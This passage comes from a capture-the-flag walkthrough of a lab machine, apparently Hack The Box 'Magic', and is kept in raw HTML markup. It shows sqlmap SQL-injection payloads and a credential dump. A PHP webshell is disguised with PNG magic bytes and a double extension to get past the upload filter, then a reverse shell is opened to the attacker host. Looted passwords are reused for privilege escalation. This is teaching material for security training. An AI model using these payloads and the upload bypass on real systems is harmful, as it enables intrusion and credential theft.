</span></span><span class=line><span class=cl>    <span class=n>Title</span><span class=p>:</span> <span class=n>OR</span> <span class=n>boolean</span><span class=o>-</span><span class=n>based</span> <span class=n>blind</span> <span class=o>-</span> <span class=n>WHERE</span> <span class=ow>or</span> <span class=n>HAVING</span> <span class=n>clause</span>
</span></span><span class=line><span class=cl>    <span class=n>Payload</span><span class=p>:</span> <span class=n>username</span><span class=o>=</span><span class=n>admin</span><span class=o>&amp;</span><span class=n>password</span><span class=o>=-</span><span class=mi>2142</span><span class=s1>&#39; OR 8380=8380-- HhVJ</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Parameter</span><span class=p>:</span> <span class=n>username</span> <span class=p>(</span><span class=n>POST</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>Type</span><span class=p>:</span> <span class=n>boolean</span><span class=o>-</span><span class=n>based</span> <span class=n>blind</span>
</span></span><span class=line><span class=cl>    <span class=n>Title</span><span class=p>:</span> <span class=n>OR</span> <span class=n>boolean</span><span class=o>-</span><span class=n>based</span> <span class=n>blind</span> <span class=o>-</span> <span class=n>WHERE</span> <span class=ow>or</span> <span class=n>HAVING</span> <span class=n>clause</span>
</span></span><span class=line><span class=cl>    <span class=n>Payload</span><span class=p>:</span> <span class=n>username</span><span class=o>=-</span><span class=mi>5412</span><span class=s1>&#39; OR 2974=2974-- buTK&amp;password=password</span>
</span></span><span class=line><span class=cl><span class=o>---</span>
</span></span><span class=line><span class=cl><span class=n>there</span> <span class=n>were</span> <span class=n>multiple</span> <span class=n>injection</span> <span class=n>points</span><span class=p>,</span> <span class=n>please</span> <span class=n>select</span> <span class=n>the</span> <span class=n>one</span> <span class=n>to</span> <span class=n>use</span> <span class=k>for</span> <span class=n>following</span> <span class=n>injections</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=n>place</span><span class=p>:</span> <span class=n>POST</span><span class=p>,</span> <span class=n>parameter</span><span class=p>:</span> <span class=n>username</span><span class=p>,</span> <span class=n>type</span><span class=p>:</span> <span class=n>Single</span> <span class=n>quoted</span> <span class=n>string</span> <span class=p>(</span><span class=n>default</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=n>place</span><span class=p>:</span> <span class=n>POST</span><span class=p>,</span> <span class=n>parameter</span><span class=p>:</span> <span class=n>password</span><span class=p>,</span> <span class=n>type</span><span class=p>:</span> <span class=n>Single</span> <span class=n>quoted</span> <span class=n>string</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>q</span><span class=p>]</span> <span class=n>Quit</span>
</span></span><span class=line><span class=cl><span class=o>&gt;</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>15</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=mi>07</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>testing</span> <span class=n>MySQL</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>15</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=mi>07</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>confirming</span> <span class=n>MySQL</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>15</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=mi>07</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>the</span> <span class=n>back</span><span class=o>-</span><span class=n>end</span> <span class=n>DBMS</span> <span class=n>is</span> <span class=n>MySQL</span>
</span></span><span class=line><span class=cl><span class=n>back</span><span class=o>-</span><span class=n>end</span> <span class=n>DBMS</span><span class=p>:</span> <span class=n>MySQL</span> <span class=o>&gt;=</span> <span class=mf>5.0</span><span class=o>.</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>15</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=mi>07</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>fetched</span> <span class=n>data</span> <span class=n>logged</span> <span class=n>to</span> <span class=n>text</span> <span class=n>files</span> <span class=n>under</span> <span class=s1>&#39;/home/cyfun/.sqlmap/output/10.10.10.185&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>Nice we have 2 injection points for our OR boolean-based blind SQL injection.</p><p>Now I&rsquo;ll some options to get more information:</p><ul><li><code>--current-user</code> -> <code>theseus@localhost</code></li><li><code>--current-db</code> -> <code>Magic</code></li><li><code>--hostname</code> -> <code>ubuntu</code></li><li><code>--is-dba</code> -> <code>False</code></li><li><code>--tables -D Magic</code> -> <code>login</code></li><li><code>-D Magic -T login --columns</code> -><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>+----------+--------------+</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>Column</span>   <span class=o>|</span> <span class=n>Type</span>         <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>+----------+--------------+</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>id</span>       <span class=o>|</span> <span class=ne>int</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span>       <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>password</span> <span class=o>|</span> <span class=n>varchar</span><span class=p>(</span><span class=mi>100</span><span class=p>)</span> <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>username</span> <span class=o>|</span> <span class=n>varchar</span><span class=p>(</span><span class=mi>50</span><span class=p>)</span>  <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>+----------+--------------+</span>
</span></span></code></pre></td></tr></table></div></div></li><li><code>-D Magic -T login --dump</code> -><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>+------+----------+----------------+
</span></span><span class=line><span class=cl>| id   | username | password       |
</span></span><span class=line><span class=cl>+------+----------+----------------+
</span></span><span class=line><span class=cl>| 1    | admin    | Th3s3usW4sK1ng |
</span></span><span class=line><span class=cl>+------+----------+----------------+
</span></span></code></pre></td></tr></table></div></div></li></ul><p>Note: We could have done a dump directly but that would have been dirty and far
less efficient if there were more databases, tables, entries, etc. Also we
probably didn&rsquo;t needed to dump the password, we could have just bypass the
authentication. But the password may be reused somewhere else and there could
have been more stuff in the DB.</p><h2 id=file-upload>File upload<a hidden class=anchor aria-hidden=true href=#file-upload>#</a></h2><p>We are now redirected to the upload page.</p><p>Only jpg, jpeg and png extensions are allowed.</p><p>If we upload a legit image, we receive a message: <code>The file hacker_logo.jpg has been uploaded.</code>.</p><p>Let&rsquo;s go back to the index to see if our logo is listed there.</p><p>The image is uploaded here: http://10.10.10.185/images/uploads/hacker_logo.jpg</p><p>And have a weird title: <code>14331a21</code>.</p><p>I check if it can be a digest with :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ haiti 14331a21
</span></span><span class=line><span class=cl>Adler-32
</span></span><span class=line><span class=cl>CRC-32B
</span></span><span class=line><span class=cl>FCS-32
</span></span><span class=line><span class=cl>GHash-32-3
</span></span><span class=line><span class=cl>GHash-32-5
</span></span><span class=line><span class=cl>FNV-132
</span></span><span class=line><span class=cl>Fletcher-32
</span></span><span class=line><span class=cl>Joaat
</span></span><span class=line><span class=cl>ELF-32
</span></span><span class=line><span class=cl>XOR-32
</span></span><span class=line><span class=cl>CRC-32 [JtR: crc32]
</span></span><span class=line><span class=cl>Microsoft Outlook PST
</span></span><span class=line><span class=cl>Dahua [JtR: dahua]
</span></span></code></pre></td></tr></table></div></div><p>The most probable option is CRC32.</p><p>So I tried to see if it could be the CRC32 of the filename with an
<a href=https://crccalc.com/>online service</a>.</p><p>But it seems not.</p><p>It could be the CRC32 of the file itself but before using more guessing let&rsquo;s
upload the same file again with the same name to see if the title is not random.</p><p>It replaced the previous image but is now entitled <code>806a94c</code>.</p><p>So the title seems to be random, so no need to try to calculate it.</p><p>So let&rsquo;s see if we can simply bypass something to upload a PHP file.</p><p>I generated a [weevely][weevely] agent (PHP webshell):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ weevely generate cyfun agentcyfun.php
</span></span><span class=line><span class=cl>Generated &#39;agentcyfun.php&#39; with password &#39;cyfun&#39; of 761 byte size.
</span></span></code></pre></td></tr></table></div></div><p>I tried to upload the shell without changing the <em>Content-Type</em> and just
changing the name to <code>agentcyfun.php.png</code> and received the following message
that suggested I was spotted:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>What are you trying to do there?
</span></span></code></pre></td></tr></table></div></div><p>But changing the Content-Type from <code>application/x-php</code> to <code>application/x-php</code>
didn&rsquo;t change anything.</p><p>The name <code>Magic</code> is maybe because there is a magic bytes check and this message
is displayed when content type, extension and magic byte don&rsquo;t match.</p><p>Let&rsquo;s check the signature of jpeg and png:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ xxd -l 12 ~/Pictures/hacker_logo.jpg     
</span></span><span class=line><span class=cl>00000000: ffd8 ffe0 0010 4a46 4946 0001            ......JFIF..
</span></span><span class=line><span class=cl>$ xxd -l 8 ~/Pictures/rawsec/logo5_50x40.png 
</span></span><span class=line><span class=cl>00000000: 8950 4e47 0d0a 1a0a                      .PNG....
</span></span></code></pre></td></tr></table></div></div><p>We can also check
<a href=https://en.wikipedia.org/wiki/List_of_file_signatures>the list on Wikipedia</a>
because jpeg supports 2 other signatures.</p><p>We can store the signatures in files:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ echo -n &#34;\x89\x50\x4e\x47\x0d\x0a\x1a\x0a&#34; &gt; png_signature
</span></span><span class=line><span class=cl>$ echo -n &#34;\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01&#34; &gt; jpg_signature
</span></span></code></pre></td></tr></table></div></div><p>Then let&rsquo;s try to prepend the PNG signature to the webshell.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat png_signature agentcyfun.php &gt; agent_png.png
</span></span><span class=line><span class=cl>$ cat jpg_signature agentcyfun.php &gt; agent_jpg.jpg
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s upload again, this time we are not spotted. The image is
successfully uploaded to http://10.10.10.185/images/uploads/agent_png.png but
as it is served as a png, the PHP is not interpreted.
Let&rsquo;s see if we send a png extension and a php Content-Type.</p><p>This is accepted too. But it is still served as a png. I&rsquo;ll try to put a php
extension but I think we will be caught by the extension whitelist.
Indeed we were spotted.</p><p>So let&rsquo;s try the double extension (<code>.png.php</code>) -> spotted.
Let&rsquo;s try a null byte injection (<code>.php\00.png</code>) even if I don&rsquo;t believe it will works.</p><p>It tells me <code>00.png</code> was uploaded (http://10.10.10.185/images/uploads/00.png)
but it&rsquo;s served as png. Let&rsquo;s see if <code>agent_png.php</code> was created
(http://10.10.10.185/images/uploads/agent_png.php): no.</p><p>What if we try the double extension without null byte but in the other way (<code>.php.png</code>).
It seems http://10.10.10.185/images/uploads/agent_png.php.png is interpreted as PHP!</p><h2 id=webshell>Webshell<a hidden class=anchor aria-hidden=true href=#webshell>#</a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>weevely</span> <span class=n>terminal</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.185</span><span class=o>/</span><span class=n>images</span><span class=o>/</span><span class=n>uploads</span><span class=o>/</span><span class=n>agent_png</span><span class=o>.</span><span class=n>php</span><span class=o>.</span><span class=n>png</span> <span class=n>cyfun</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>weevely</span> <span class=mf>4.0</span><span class=o>.</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Target</span><span class=p>:</span>     <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.185</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Session</span><span class=p>:</span>    <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/.</span><span class=n>weevely</span><span class=o>/</span><span class=n>sessions</span><span class=o>/</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.185</span><span class=o>/</span><span class=n>agent_png</span><span class=o>.</span><span class=n>php_0</span><span class=o>.</span><span class=n>session</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Browse</span> <span class=n>the</span> <span class=n>filesystem</span> <span class=ow>or</span> <span class=n>execute</span> <span class=n>commands</span> <span class=n>starts</span> <span class=n>the</span> <span class=n>connection</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>to</span> <span class=n>the</span> <span class=n>target</span><span class=o>.</span> <span class=n>Type</span> <span class=p>:</span><span class=n>help</span> <span class=k>for</span> <span class=n>more</span> <span class=n>information</span><span class=o>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>weevely</span><span class=o>&gt;</span> <span class=n>id</span>
</span></span><span class=line><span class=cl><span class=n>uid</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>)</span> <span class=n>gid</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>)</span> <span class=n>groups</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>Magic</span><span class=o>/</span><span class=n>images</span><span class=o>/</span><span class=n>uploads</span> <span class=o>$</span> 
</span></span></code></pre></td></tr></table></div></div><p>The issue is that the webshell is removed a few seconds after being uploaded.
So we&rsquo;ll have to use a PHP dropper to get a rverse shell immediately.</p><p>We could craft one with <code>msfvenom</code> (from [Metasploit][msf]) but weevely have a
bunch of useful modules like this one:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>Magic</span><span class=o>/</span><span class=n>images</span><span class=o>/</span><span class=n>uploads</span> <span class=o>$</span> <span class=p>:</span><span class=n>backdoor_reversetcp</span> <span class=o>-</span><span class=n>h</span>
</span></span><span class=line><span class=cl><span class=n>usage</span><span class=p>:</span> <span class=n>backdoor_reversetcp</span> <span class=p>[</span><span class=o>-</span><span class=n>h</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>shell</span> <span class=n>SHELL</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>no</span><span class=o>-</span><span class=n>autonnect</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>vector</span> <span class=p>{</span><span class=n>netcat_bsd</span><span class=p>,</span><span class=n>netcat</span><span class=p>,</span><span class=n>python</span><span class=p>,</span><span class=n>devtcp</span><span class=p>,</span><span class=n>perl</span><span class=p>,</span><span class=n>ruby</span><span class=p>,</span><span class=n>telnet</span><span class=p>,</span><span class=n>python_pty</span><span class=p>}]</span> <span class=n>lhost</span> <span class=n>port</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Execute</span> <span class=n>a</span> <span class=n>reverse</span> <span class=n>TCP</span> <span class=n>shell</span><span class=o>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>positional</span> <span class=n>arguments</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=n>lhost</span>                 <span class=n>Local</span> <span class=n>host</span>
</span></span><span class=line><span class=cl>  <span class=n>port</span>                  <span class=n>Port</span> <span class=n>to</span> <span class=n>spawn</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>optional</span> <span class=n>arguments</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=o>-</span><span class=n>h</span><span class=p>,</span> <span class=o>--</span><span class=n>help</span>            <span class=n>show</span> <span class=n>this</span> <span class=n>help</span> <span class=n>message</span> <span class=ow>and</span> <span class=n>exit</span>
</span></span><span class=line><span class=cl>  <span class=o>-</span><span class=n>shell</span> <span class=n>SHELL</span>          <span class=n>Specify</span> <span class=n>shell</span>
</span></span><span class=line><span class=cl>  <span class=o>-</span><span class=n>no</span><span class=o>-</span><span class=n>autonnect</span>         <span class=n>Skip</span> <span class=n>autoconnect</span>
</span></span><span class=line><span class=cl>  <span class=o>-</span><span class=n>vector</span> <span class=p>{</span><span class=n>netcat_bsd</span><span class=p>,</span><span class=n>netcat</span><span class=p>,</span><span class=n>python</span><span class=p>,</span><span class=n>devtcp</span><span class=p>,</span><span class=n>perl</span><span class=p>,</span><span class=n>ruby</span><span class=p>,</span><span class=n>telnet</span><span class=p>,</span><span class=n>python_pty</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Note: for OSCP it&rsquo;s also good to know how to do without [Metasploit][msf].</p><p>I start a [pwncat] listener on my machine:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ pwncat -l 8888
</span></span></code></pre></td></tr></table></div></div><p>Re-uploaded my webshell, executed it and launched the reverse shell module:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>weevely&gt; :backdoor_reversetcp 10.10.15.18 8888
</span></span></code></pre></td></tr></table></div></div><p>Nice, I have a true shell that I won&rsquo;t lost on my [pwncat][pwncat] listener:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ pwncat -l 8888
</span></span><span class=line><span class=cl>/bin/sh: 0: can&#39;t access tty; job control turned off
</span></span><span class=line><span class=cl>$ id
</span></span><span class=line><span class=cl>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation--www-data-to-theseus>Privilege Escalation : www-data to theseus<a hidden class=anchor aria-hidden=true href=#privilege-escalation--www-data-to-theseus>#</a></h2><p>We can just connect by re-using the credentials we looted during the SQLi.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>python3</span> <span class=o>-</span><span class=n>c</span> <span class=s2>&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>Magic</span><span class=o>/</span><span class=n>images</span><span class=o>/</span><span class=n>uploads</span><span class=o>$</span> <span class=n>ls</span> <span class=o>/</span><span class=n>home</span>
</span></span><span class=line><span class=cl><span class=n>theseus</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>Magic</span><span class=o>/</span><span class=n>images</span><span class=o>/</span><span class=n>uploads</span><span class=o>$</span> <span class=n>su</span> <span class=n>theseus</span>
</span></span><span class=line><span class=cl><span class=n>Password</span><span class=p>:</span> <span class=n>Th3s3usW4sK1ng</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>theseus</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>Magic</span><span class=o>/</span><span class=n>images</span><span class=o>/</span><span class=n>uploads</span><span class=o>$</span> <span class=n>id</span>
</span></span><span class=line><span class=cl><span class=n>uid</span><span class=o>=</span><span class=mi>1000</span><span class=p>(</span><span class=n>theseus</span><span class=p>)</span> <span class=n>gid</span><span class=o>=</span><span class=mi>1000</span><span class=p>(</span><span class=n>theseus</span><span class=p>)</span> <span class=n>groups</span><span class=o>=</span><span class=mi>1000</span><span class=p>(</span><span class=n>theseus</span><span class=p>),</span><span class=mi>100</span><span class=p>(</span><span class=n>users</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>But there was another method for those who just used an authentication bypass
instead of dumping the database.</p><p>Find the database credentials:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>theseus</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>Magic</span><span class=o>/</span><span class=n>images</span><span class=o>/</span><span class=n>uploads</span><span class=o>$</span> <span class=n>ls</span> <span class=o>../..</span>
</span></span><span class=line><span class=cl><span class=n>assets</span>   <span class=n>images</span>     <span class=n>login</span><span class=o>.</span><span class=n>php</span>   <span class=n>sql</span><span class=o>.</span><span class=n>php</span>     <span class=n>sql_v3</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=n>db</span><span class=o>.</span><span class=n>php5</span>  <span class=n>index</span><span class=o>.</span><span class=n>php</span>  <span class=n>logout</span><span class=o>.</span><span class=n>php</span>  <span class=n>sql_v2</span><span class=o>.</span><span class=n>php</span>  <span class=n>upload</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>theseus</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>Magic</span><span class=o>/</span><span class=n>images</span><span class=o>/</span><span class=n>uploads</span><span class=o>$</span> <span class=n>cat</span> <span class=o>../../</span><span class=n>db</span><span class=o>.</span><span class=n>php5</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=n>Database</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>private</span> <span class=k>static</span> <span class=o>$</span><span class=n>dbName</span> <span class=o>=</span> <span class=s1>&#39;Magic&#39;</span> <span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>private</span> <span class=k>static</span> <span class=o>$</span><span class=n>dbHost</span> <span class=o>=</span> <span class=s1>&#39;localhost&#39;</span> <span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>private</span> <span class=k>static</span> <span class=o>$</span><span class=n>dbUsername</span> <span class=o>=</span> <span class=s1>&#39;theseus&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>private</span> <span class=k>static</span> <span class=o>$</span><span class=n>dbUserPassword</span> <span class=o>=</span> <span class=s1>&#39;iamkingtheseus&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span></code></pre></td></tr></table></div></div><p>And then dump the database:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=err>$</span><span class=w> </span><span class=n>mysqldump</span><span class=w> </span><span class=o>--</span><span class=k>databases</span><span class=w> </span><span class=n>Magic</span><span class=w> </span><span class=o>-</span><span class=n>utheseus</span><span class=w> </span><span class=o>-</span><span class=n>piamkingtheseus</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>...</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>INSERT</span><span class=w> </span><span class=k>INTO</span><span class=w> </span><span class=o>`</span><span class=n>login</span><span class=o>`</span><span class=w> </span><span class=k>VALUES</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=s1>&#39;admin&#39;</span><span class=p>,</span><span class=s1>&#39;Th3s3usW4sK1ng&#39;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>...</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>And then log in with <code>su</code> too.</p><p>Then let&rsquo;s loot the flag and copy the private key, so if the box is reset we
can start back from here instead of playing with the reverse shell again.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>theseus@ubuntu:~$ cat user.txt
</span></span><span class=line><span class=cl>1a1fa3ca1d83a1b0dd709cdcbdb15df0
